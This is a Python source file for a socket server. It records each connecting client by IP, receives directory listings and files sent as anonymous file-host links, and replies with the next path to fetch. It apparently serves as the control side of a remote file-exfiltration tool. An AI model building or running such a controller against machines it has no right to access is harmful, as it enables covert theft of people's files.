from src.tui import Tui

from socket import socket, AF_INET, SOCK_STREAM, setdefaulttimeout
from json import dumps, loads
from json.decoder import JSONDecodeError
from os import mkdir
from os.path import isdir



def LaunchServer(host: str = '', port: int = 5000) -> None:
    return Server(host=host, port=port)
    # return Thread(target=Server, args=[host, port]).start()


class Server:
    def __init__(self, host: str, port: int, max_clients: int = 10) -> None:
        self.server = socket(AF_INET, SOCK_STREAM)

        self.server.bind((host, port))
        self.server.listen()
        self.Listen()

    def Listen(self) -> None:
        while True:
            Tui.Waiting()
            client = self.server.accept()
            client = client[0], client[1][0]
            self.NewClient(client=client)

    def NewClient(self, client: tuple):
        try:
            sock = client[0]
            ip = client[1]
            dir = f'db/{ip}'
            if not isdir(dir):
                mkdir(dir)
            method, path = self.ClientRecv(sock=sock, ip=ip, new=True)
            self.ClientSend(sock=sock, method=method, path=path)
            while True:
                method, path = self.ClientRecv(sock=sock, ip=ip)
                self.ClientSend(sock=sock, method=method, path=path)
        except:
            self.CloseConn(sock=sock)

    def CloseConn(self, sock: socket) -> None:
        try:
            self.client = ()
            sock.close()
        except:
            pass

    def ClientRecv(self, sock: socket, ip: str, new: bool = False) -> dict:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
            "content": "anonfiles_link" or "listdir(dir)"
        }
        """
        recv = sock.recv(4096).decode('utf-8')
        try:
            json = loads(recv)
        except JSONDecodeError:
            input(recv)
            return self.CloseConn(sock=sock)
        for x in ('method', 'path', 'content'):
            if x not in json:
                input(json)
                return self.CloseConn(sock=sock)
        if json['method'] not in ('FILE','DIR'):
            input(json)
            return self.CloseConn(sock=sock)
        if len(json) != 3:
            input(json)
            return self.CloseConn(sock=sock)
            
            
        if json['method'] == 'FILE' and not new:
            method, path = Tui.File(path=json['path'], url=json['content'], ip=ip)
        elif json['method'] == 'DIR':
            self.listdir = json['content']
            method, path = Tui.Dir(path=json['path'], listdir=json['content'], ip=ip)
        else:
            input(json['method'])
            return self.CloseConn(sock=sock)
        
        return method, path
        ...


    def ClientSend(self, sock: socket, method: str, path: str) -> dict:
        """
        {
            "method": "FILE" or "DIR"
            "path" : "PATH"
        }
        """

        sock.send(dumps({'method': method, 'path': path}).encode('utf-8'))